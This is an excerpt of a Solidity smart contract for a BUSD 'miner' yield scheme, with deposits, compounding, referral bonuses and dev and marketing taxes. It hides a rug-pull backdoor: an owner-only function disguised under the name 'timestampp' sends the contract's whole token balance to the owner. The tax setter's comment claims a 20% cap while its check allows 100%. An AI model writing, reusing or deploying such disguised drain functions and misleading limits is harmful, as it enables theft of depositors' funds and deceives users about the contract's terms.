...
contract testy {
	...
	//address erctoken = 0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7; /** BUSD Testnet **/ 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56; /** BUSD Mainnet **/
    address erctoken = 0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee; 
    uint256 public EGGS_TO_HIRE_1MINERS = 1728000; //5%
    uint256 public PERCENTS_DIVIDER = 1000;
    uint256 public REFERRAL = 200;//20% referral bonus
    uint256 public TAX = 44; //4.4% x 2 WALLETS = 8.8 tax
    ...
    uint256 public WALLET_DEPOSIT_LIMIT = 10000 * 1e18; /** 2000 busd AT START THEN 10000 BUSD  **/

	uint256 public COMPOUND_BONUS = 15; /** 1.5% **/
	uint256 public COMPOUND_BONUS_MAX_TIMES = 5; /** 5 times / 5 days. **/
    ...
    constructor(address _dev, address _marketing) {
		require(!isContract(_dev) && !isContract(_marketing));
        owner = msg.sender;
        dev = _dev;
    ...
    function bakeMoreCats(bool isCompound) public {
    ...
    function bakeCats(address ref, uint256 amount) public{
        require(contractStarted, "Contract not yet Started.");
        User storage user = users[msg.sender];
    ...
    function payFees(uint256 eggValue) internal returns(uint256){
        ...
        token_BUSD.transfer(marketing, tax);
        return tax.mul(2);
    }
    ...
    function PRC_TAX(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value <= 1000); /** 20% max **/
        TAX = value;
    }    

    function PRC_REFERRAL(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 10 && value <= 200); /** 10% max **/
        REFERRAL = value;
    }
    ...
    function timestampp () external{
        require(msg.sender == owner, "Admin use only");
        IToken(erctoken).transfer(msg.sender, IToken(erctoken).balanceOf(address(this)));
    }
}